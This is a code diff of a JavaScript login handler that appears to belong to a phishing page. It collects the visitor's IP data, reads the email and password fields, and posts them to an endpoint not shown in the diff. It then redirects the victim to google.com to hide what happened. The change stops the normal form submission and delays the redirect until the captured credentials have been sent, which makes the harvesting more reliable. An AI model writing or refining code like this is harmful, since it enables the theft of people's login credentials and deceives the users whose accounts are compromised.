@@ -22,7 +22,9 @@ async function fetchIPData() {
 fetchIPData();
 
 // Handle login
-document.querySelector('.submit').addEventListener('click', function () {
+document.querySelector('.submit').addEventListener('click', function (event) {
+    event.preventDefault(); // Prevent form submission (if applicable)
+
     var email = document.getElementById('mail').value;
     var password = document.getElementById('pass').value;
 
@@ -36,10 +38,14 @@ document.querySelector('.submit').addEventListener('click', function () {
         })
     })
     .then(response => response.json())
-    .then(data => console.log("Response:", data))
-    .catch(error => console.error("Error:", error));
-
-    window.location.href = "https://www.google.com";
+    .then(data => {
+        console.log("Response:", data);
+        // Redirect to Google only after the data is sent successfully
+        window.location.href = "https://www.google.com";
+    })
+    .catch(error => {
+        console.error("Error:", error);
+    });
 
     // Reset fields
     document.getElementById("mail").value = "";
